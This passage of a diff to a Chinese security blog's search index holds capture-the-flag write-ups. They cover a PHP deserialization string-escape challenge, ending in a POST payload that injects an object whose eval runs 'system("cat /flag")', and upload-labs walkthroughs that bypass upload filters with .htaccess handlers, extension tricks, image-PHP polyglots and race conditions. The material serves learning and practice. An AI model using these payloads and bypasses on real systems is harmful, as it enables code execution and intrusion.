class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">object_sleep</span>(<span class="variable">$user</span>))));</span><br></pre></td></tr></table></figure>
+
+<p>刚打开有一个回显<code>object(UserAccount)#1 (2) &#123; [&quot;username&quot;:protected]=&gt; NULL [&quot;password&quot;:protected]=&gt; NULL &#125;</code></p>
+<p>看到最后有unserialize函数，可以反序列化，反序列化前还有自定义的函数<code>object_weakup</code>和<code>object_sleep</code>会起作用，看着两个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function object_sleep($str)</span><br><span class="line">&#123;</span><br><span class="line">    $ob = str_replace(&#x27;a*a&#x27;, &#x27;@0@0@0@0@&#x27;, $str);</span><br><span class="line">    return $ob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function object_weakup($ob)</span><br><span class="line">&#123;</span><br><span class="line">    $r = str_replace(&#x27;@0@0@0@0@&#x27;, &#x27;a*a&#x27;, $ob);</span><br><span class="line">    return $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>object_sleep</code>会把<code>a*a</code>换为<code>@0@0@0@0@</code>，而<code>object_weakup</code>会把<code>@0@0@0@0@</code>换为<code>a*a</code>如果传入的有<code>a*a</code>，那么经过这两个函数的作用会相互抵消，就没有任何作用，但如果传入的是<code>@0@0@0@0@</code>，<code>object_sleep</code>函数就不会起作用，而是<code>object_sleep</code>会起作用，会使字符串减少，这就可以使用反序列化的字符串逃逸</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class order</span><br><span class="line">&#123;</span><br><span class="line">    public $f;</span><br><span class="line">    public $hint;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        eval($this-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">$user = serialize(new UserAccount($username, $password));</span><br></pre></td></tr></table></figure>
+
+<p>但是我们可以利用的是username和password，需要靠<code>eval($this-&gt;f);</code>来获得flag，没办法直接给order类的f属性传参，这就需要靠字符串逃逸了</p>
+<p>先讲一下字符串减少的逃逸</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="string">&#x27;@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&#x27;</span>, <span class="string">&#x27;111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)));</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>a*aa*aa*aa*aa*a<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>本来给username赋值的是<code>@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@</code>，给password赋值的是<code>111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;</code>，但经过字符串减少的函数后username的值就变成了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:38:&quot;111</code>，password的值就成了123，而这个123就相当于逃逸出来，我们可以自己控制，只需要改变<code>s:3:&quot;123&quot;;</code>这里</p>
+<p>所以这个题就可以让后面逃逸出来给f属性进行传参，需要的f值是<code>system(&quot;cat /flag&quot;);</code>，需要让password的值传为<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>，这样就可以给order类中的f属性进行赋值，但是如果直接给password传这个值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new UserAccount(&#x27;123&#x27;, &#x27;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>那么序列化之后只会把这个值当作一个字符串看待，不会把它当作一个类，需要将这个值单独逃逸出来</p>
+<p>最终的payload可以是这样</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&amp;password=123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样进行字符串减少后就成了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:11:&quot;UserAccount&quot;:2:&#123;s:11:&quot; * username&quot;;s:45:&quot;a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就相当于给username赋值了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123</code>，给password赋值了一个类，而不是一个字符串，<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>被当作类来处理从而给f属性进行赋值，最后利用<code>eval</code>来得到flag</p>
+]]></content>
+  </entry>
+  <entry>
     <title>buu的upload</title>
     <url>/2022/12/03/upload%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
     <content><![CDATA[<p>[ACTF2020 新生赛]Upload	[GXYCTF2019]BabyUpload	[MRCTF2020]你传你🐎呢	[极客大挑战 2019]Upload</p>
@@ -1553,66 +1610,10 @@
 ]]></content>
   </entry>
   <entry>
-    <title>upload-labs关卡</title>
-    <url>/2022/11/19/upload-labs/</url>
-    <content><![CDATA[<p>简介</p>
-<span id="more"></span>
-
-<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>js绕过<br>只允许上传.jpg|.png|.gif后缀的文件<br>那就上传.gif的文件<br>使用burp抓包<br>在burp里修改后缀.gif为.php然后执行</p>
-<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>mime头检测(会自动检测文件类型)<br>上传.php后缀的文件<br>使用burp抓包里面的Content-Type是来标识该文件是个什么类型的文件（php还是jpg或者gif等等)<br>将Content-Type后改为image&#x2F;jpeg让代码以为上传的php文件是可以通过的文件<br>然后放包</p>
-<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>源代码$deny_ext &#x3D; array(‘.asp’,’.aspx’,’.php’,’.jsp’);这个意思是.asp .aspx .php .jsp的文件都不能上传，如果检测到就进行拦截。<br>使用不常见的后缀，比如.php3 .php2等等</p>
-<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>源代码$deny_ext &#x3D; array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”)<br>这条语句几乎将不常用的后缀都已经拦截<br>所以上传.htaccess文件，让他把任何文件都当做”.php”去读取，这就是.htaccess的功能<br>写入.htacess文件一下内容<br>&lt;FilesMatch “jpg”&gt;&#x2F;&#x2F;为指定上传的文件后缀起作用<br>SetHandler application&#x2F;x-httpd-php&#x2F;&#x2F;是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错<br><br>然后再上传一个jpg后缀的文件就可以了</p>
-<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>方法一(?)<br>除了拦截的后缀的第四关一样又拦截了.htaccess<br>但源代码里没有循环，这些语句只会执行一次<br>在burp里进行修改为xx.php. .再放包<br>只要保证有两个分开的点就行了演示过程中是最简的方法，两个点放在一起会被防护规则同时删除掉<br>由于Windows系统的命名规则，无论你后缀有多少个空格和点他都会给你自动删除掉<br>方法二<br>源代码里没有了转换为小写<br>上传.php文件后<br>再burp中改为.phP<br>直接放包</p>
-<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关(?)"></a>第六关(?)</h3><p>源代码里没有了首尾去空，可以上传.php文件然后用burp抓包<br>在burp中在.php后加一个空格然后再放包</p>
-<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>源代码里没有了删除文件名末尾的点<br>上传.php文件后<br>再burp中改为.php.<br>直接放包</p>
-<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p>源代码中没有了去除字符串::$DATA<br>上传.php文件后<br>再burp中改为.php::$DATA<br>直接放包</p>
-<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>上传.php文件<br>使用burp抓包<br>然后在burp里修改为.php. .<br>最后放包</p>
-<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>上传.php文件<br>使用burp抓包<br>然后在burp里修改为.pphphp<br>最后放包</p>
-<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关(?)"></a>第十一关(?)</h3><h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关(?)"></a>第十二关(?)</h3><h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h3><h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h3><h3 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h3><p>将一个.php文件个一个.jpg文件和成一个.jpg文件<br>在cmd中使用copy &#x2F;b xx.jpg+xx.php&#x3D;xx.jpg<br>使用burp抓包<br>进行发送</p>
-<h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关(?)"></a>第十六关(?)</h3><p>二次渲染</p>
-<h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p>条件竞争<br>上传.php文件<br>进入intruder进行攻击<br>然后在positions中将§<?php phpinfo();?>§修改为§<?php phpinfo();?>§1§<br>然后进入payloads中进行循环攻击10000次<br>最后直接询问网站</p>
-<h3 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h3><p>图片型的条件竞争<br>上传.jpg文件进入intruder进行攻击<br>然后在positions中将§<?php phpinfo();?>§修改为§<?php phpinfo();?>§1§<br>然后进入payloads中进行循环攻击10000次<br>最后直接询问网站</p>
-<h3 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h3><p>该题在网页上不仅可以上传文件还可以修改文件名称<br>上传.php文件<br>然后在网页上将文件名修改为.PHP然后进行上传<br>直接访问网页</p>
-<h3 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关(?)"></a>第二十关(?)</h3>]]></content>
-  </entry>
-  <entry>
-    <title>反序列化逃逸</title>
-    <url>/2022/12/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
-    <content><![CDATA[<p>字符减少型</p>
-<span id="more"></span>
-
-<p>源码是</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_sleep</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ob</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a*a&#x27;</span>, <span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">object_sleep</span>(<span class="variable">$user</span>))));</span><br></pre></td></tr></table></figure>
-
-<p>刚打开有一个回显<code>object(UserAccount)#1 (2) &#123; [&quot;username&quot;:protected]=&gt; NULL [&quot;password&quot;:protected]=&gt; NULL &#125;</code></p>
-<p>看到最后有unserialize函数，可以反序列化，反序列化前还有自定义的函数<code>object_weakup</code>和<code>object_sleep</code>会起作用，看着两个函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function object_sleep($str)</span><br><span class="line">&#123;</span><br><span class="line">    $ob = str_replace(&#x27;a*a&#x27;, &#x27;@0@0@0@0@&#x27;, $str);</span><br><span class="line">    return $ob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function object_weakup($ob)</span><br><span class="line">&#123;</span><br><span class="line">    $r = str_replace(&#x27;@0@0@0@0@&#x27;, &#x27;a*a&#x27;, $ob);</span><br><span class="line">    return $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>object_sleep</code>会把<code>a*a</code>换为<code>@0@0@0@0@</code>，而<code>object_weakup</code>会把<code>@0@0@0@0@</code>换为<code>a*a</code>如果传入的有<code>a*a</code>，那么经过这两个函数的作用会相互抵消，就没有任何作用，但如果传入的是<code>@0@0@0@0@</code>，<code>object_sleep</code>函数就不会起作用，而是<code>object_sleep</code>会起作用，会使字符串减少，这就可以使用反序列化的字符串逃逸</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class order</span><br><span class="line">&#123;</span><br><span class="line">    public $f;</span><br><span class="line">    public $hint;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        eval($this-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">$user = serialize(new UserAccount($username, $password));</span><br></pre></td></tr></table></figure>
-
-<p>但是我们可以利用的是username和password，需要靠<code>eval($this-&gt;f);</code>来获得flag，没办法直接给order类的f属性传参，这就需要靠字符串逃逸了</p>
-<p>先讲一下字符串减少的逃逸</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="string">&#x27;@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&#x27;</span>, <span class="string">&#x27;111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)));</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>a*aa*aa*aa*aa*a<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>本来给username赋值的是<code>@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@</code>，给password赋值的是<code>111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;</code>，但经过字符串减少的函数后username的值就变成了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:38:&quot;111</code>，password的值就成了123，而这个123就相当于逃逸出来，我们可以自己控制，只需要改变<code>s:3:&quot;123&quot;;</code>这里</p>
-<p>所以这个题就可以让后面逃逸出来给f属性进行传参，需要的f值是<code>system(&quot;cat /flag&quot;);</code>，需要让password的值传为<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>，这样就可以给order类中的f属性进行赋值，但是如果直接给password传这个值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new UserAccount(&#x27;123&#x27;, &#x27;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p>那么序列化之后只会把这个值当作一个字符串看待，不会把它当作一个类，需要将这个值单独逃逸出来</p>
-<p>最终的payload可以是这样</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&amp;password=123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样进行字符串减少后就成了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:11:&quot;UserAccount&quot;:2:&#123;s:11:&quot; * username&quot;;s:45:&quot;a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>就相当于给username赋值了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123</code>，给password赋值了一个类，而不是一个字符串，<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>被当作类来处理从而给f属性进行赋值，最后利用<code>eval</code>来得到flag</p>
-]]></content>
-  </entry>
-  <entry>
     <title>thinkshop(强网杯 2023)</title>
     <url>/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%202023/</url>
     <content><![CDATA[<p>thinkshop</p>
+<p>SQL拼接</p>
 <p>Thinkphp 5.0.24 反序列化（任意文件写入）漏洞</p>
 <span id="more"></span>
 
@@ -1623,7 +1624,10 @@
 <p>thinkphp源码：<a href="https://gitee.com/emmm159/images/blob/master/source/%E5%BC%BA%E7%BD%91%E6%9D%AF%202023/html.zip">源码</a></p>
 <p>知识点：</p>
 <ul>
-<li>Thinkphp 5.0.24 反序列化（任意文件写入）漏洞</li>
+<li><p>SQL拼接</p>
+</li>
+<li><p>Thinkphp 5.0.24 反序列化（任意文件写入）漏洞</p>
+</li>
 </ul>
